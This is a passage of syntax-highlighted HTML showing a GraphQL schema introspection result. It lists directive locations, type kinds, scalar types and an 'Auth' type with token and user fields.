class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;description&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;locations&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;LIST&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;ENUM&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;__DirectiveLocation&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}}}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;name&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="s2">&#34;Use `locations`.&#34;</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">true</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;onField&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Boolean&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="s2">&#34;Use `locations`.&#34;</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">true</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;onFragment&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Boolean&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="s2">&#34;Use `locations`.&#34;</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">true</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;onOperation&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Boolean&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}}],</span><span class="nt">&#34;inputFields&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;interfaces&#34;</span><span class="p">:[],</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;__Directive&#34;</span><span class="p">,</span><span class="nt">&#34;possibleTypes&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">},{</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;A Directive can be adjacent to many parts of the GraphQL language, a __DirectiveLocation describes one such possible adjacencies.&#34;</span><span class="p">,</span><span class="nt">&#34;enumValues&#34;</span><span class="p">:[{</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Location adjacent to a field.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;FIELD&#34;</span><span class="p">},{</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Location adjacent to a schema definition.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;SCHEMA&#34;</span><span class="p">},{</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Location adjacent to an input object type definition.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;INPUT_OBJECT&#34;</span><span class="p">},{</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Location adjacent to a mutation operation.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;MUTATION&#34;</span><span class="p">},{</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Location adjacent to a scalar definition.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">},{</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Location adjacent to an enum value definition.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;ENUM_VALUE&#34;</span><span class="p">},{</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Location adjacent to an enum definition.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;ENUM&#34;</span><span class="p">},{</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Location adjacent to a query operation.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;QUERY&#34;</span><span class="p">},{</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Location adjacent to a subscription operation.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;SUBSCRIPTION&#34;</span><span class="p">},{</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Location adjacent to a fragment definition.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;FRAGMENT_DEFINITION&#34;</span><span class="p">},{</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Location adjacent to a fragment spread.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;FRAGMENT_SPREAD&#34;</span><span class="p">},{</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Location adjacent to an inline fragment.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;INLINE_FRAGMENT&#34;</span><span class="p">},{</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Location adjacent to an argument definition.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;ARGUMENT_DEFINITION&#34;</span><span class="p">},{</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Location adjacent to a object definition.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">},{</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Location adjacent to a field definition.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;FIELD_DEFINITION&#34;</span><span class="p">},{</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Location adjacent to an interface definition.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;INTERFACE&#34;</span><span class="p">},{</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Location adjacent to a union definition.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;UNION&#34;</span><span class="p">},{</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Location adjacent to an input object field definition.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;INPUT_FIELD_DEFINITION&#34;</span><span class="p">}],</span><span class="nt">&#34;fields&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;inputFields&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;interfaces&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;ENUM&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;__DirectiveLocation&#34;</span><span class="p">,</span><span class="nt">&#34;possibleTypes&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">},{</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;The `String` scalar type represents textual data, represented as UTF-8 character sequences. The String type is most often used by GraphQL to represent free-form human-readable text.&#34;</span><span class="p">,</span><span class="nt">&#34;enumValues&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;fields&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;inputFields&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;interfaces&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;possibleTypes&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">},{</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Auth info for a user&#34;</span><span class="p">,</span><span class="nt">&#34;enumValues&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;fields&#34;</span><span class="p">:[{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;The token&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;token&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;The user&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;user&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;User&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}}],</span><span class="nt">&#34;inputFields&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;interfaces&#34;</span><span class="p">:[],</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Auth&#34;</span><span class="p">,</span><span class="nt">&#34;possibleTypes&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">},{</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;An enum describing what kind of type a given `__Type` is&#34;</span><span class="p">,</span><span class="nt">&#34;enumValues&#34;</span><span class="p">:[{</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Indicates this type is an enum. `enumValues` is a valid field.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;ENUM&#34;</span><span class="p">},{</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Indicates this type is an input object. `inputFields` is a valid field.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;INPUT_OBJECT&#34;</span><span class="p">},{</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Indicates this type is a list. `ofType` is a valid field.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;LIST&#34;</span><span class="p">},{</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Indicates this type is a non-null. `ofType` is a valid field.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">},{</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Indicates this type is a scalar.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">},{</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Indicates this type is an object. `fields` and `interfaces` are valid fields.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">},{</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Indicates this type is an interface. `fields` and `possibleTypes` are valid fields.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;INTERFACE&#34;</span><span class="p">},{</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Indicates this type is a union. `possibleTypes` is a valid field.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;UNION&#34;</span><span class="p">}],</span><span class="nt">&#34;fields&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;inputFields&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;interfaces&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;ENUM&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;__TypeKind&#34;</span><span class="p">,</span><span class="nt">&#34;possibleTypes&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">},{</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;The `Boolean` scalar type represents `true` or `false`.&#34;</span><span class="p">,</span><span class="nt">&#34;enumValues&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;fields&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;inputFields&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;interfaces&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Boolean&#34;</span><span class="p">,</span><span class="nt">&#34;possibleTypes&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">},{</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;One possible value for a given Enum. Enum values are unique values, not a placeholder for a string or numeric value. However an Enum value is returned in a JSON response as a string.&#34;</span><span class="p">,</span><span class="nt">&#34;enumValues&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;fields&#34;</span><span class="p">:[{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;deprecationReason&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;description&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;isDeprecated&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Boolean&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;name&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span 